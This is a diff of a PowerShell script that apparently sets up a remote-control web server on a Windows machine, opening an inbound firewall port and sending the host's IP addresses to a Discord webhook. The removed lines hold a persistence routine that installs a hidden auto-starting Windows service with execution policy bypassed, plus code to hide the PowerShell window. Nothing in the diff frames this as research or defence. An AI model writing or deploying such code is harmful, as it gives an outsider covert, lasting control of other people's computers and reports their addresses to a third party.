@@ -9,38 +9,6 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit
 }
 
-# Create persistence service
-$serviceName = "WebRemote"
-$servicePath = "$env:TEMP\web_remote.ps1"
-
-# Copy script to temp location
-Copy-Item $PSCommandPath $servicePath -Force
-
-# Create Windows Service
-try {
-    # Check if service already exists
-    $existingService = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
-    if ($existingService) {
-        Stop-Service -Name $serviceName -Force
-        Remove-Service -Name $serviceName -Force
-    }
-    
-    # Create new service
-    New-Service -Name $serviceName -BinaryPathName "powershell.exe" -DisplayName "Web Remote Control" -Description "Remote web control service" -StartupType Automatic
-    
-    # Set service parameters
-    $serviceConfig = Get-WmiObject -Class Win32_Service -Filter "Name='$serviceName'"
-    $serviceConfig.Change($null, $null, $null, $null, $null, "-NoProfile -ExecutionPolicy Bypass -File `"$servicePath`" -WindowStyle Hidden")
-    
-    Start-Service -Name $serviceName
-    
-    # Send notification
-    $body = @{content="Service '$serviceName' started successfully! Web server will persist across reboots."} | ConvertTo-Json
-    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
-} catch {
-    # If service creation fails, continue with normal execution
-}
-
 # Open firewall port
 try {
     netsh advfirewall firewall add rule name="WebRemote" dir=in action=allow protocol=TCP localport=$port
@@ -60,8 +28,8 @@ $ips += "127.0.0.1"
 
 # Send IP info to Discord
 try {
-    $ipList = $ips -join "`n"
-    $body = @{content="Web server started! Access URLs:`n$($ips | ForEach-Object { "http://$_`:$port" })"} | ConvertTo-Json
+    $ipList = $ips -join "\n"
+    $body = @{content="Web server started! Access URLs:\n$($ips | ForEach-Object { "http://$_`:$port" })"} | ConvertTo-Json
     Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
 } catch {
     # If Discord fails, continue anyway
@@ -158,16 +126,8 @@ $html = @"
 
 # HTTP Server
 $listener = New-Object System.Net.HttpListener
-
-# Try to start on port 8080, if fails use 8081
-try {
-    $listener.Prefixes.Add("http://+:$port/")
-    $listener.Start()
-} catch {
-    $port = 8081
-    $listener.Prefixes.Add("http://+:$port/")
-    $listener.Start()
-}
+$listener.Prefixes.Add("http://+:$port/")
+$listener.Start()
 
 $outputBuffer = ""
 
@@ -318,11 +278,6 @@ IPs: $($ips -join ', ')
 
 # Keep server running indefinitely
 try {
-    # Hide PowerShell window
-    Add-Type -Name User32 -Namespace Win32Api -PassThru
-    $user32 = [User32]::new()
-    $user32::ShowWindow(0, 0)
-    
     while ($true) {
         Start-Sleep -Seconds 1
     }
